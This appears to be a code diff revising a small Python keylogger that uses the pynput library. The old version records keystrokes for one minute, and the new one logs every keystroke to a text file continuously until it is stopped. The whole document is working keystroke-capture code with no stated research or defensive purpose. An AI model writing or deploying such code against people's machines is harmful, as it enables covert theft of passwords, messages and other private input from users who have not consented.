@@ -1,25 +1,20 @@
-import pynput.keyboard
-import time
+from pynput import keyboard
+
+log_file = "keylog.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(key.char)
+    except AttributeError:
+        with open(log_file, "a") as f:
+            f.write(f"[{key}]")
 
 def run():
-    log = []
+    # Starts the keylogger and waits for keys to be pressed
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
 
-    def on_press(key):
-        try:
-            log.append(key.char)
-        except AttributeError:
-            log.append(f"[{key}]")
-
-    listener = pynput.keyboard.Listener(on_press=on_press)
-    listener.start()
-
-    # Capture keystrokes for a set amount of time
-    time.sleep(60)  # 1 minute
-    listener.stop()
-
-    log_data = ''.join(log)
-    with open('keylogger_output.txt', 'w') as file:
-        file.write(log_data)
-
-    return 'keylogger_output.txt'
+if __name__ == "__main__":
+    run()
 
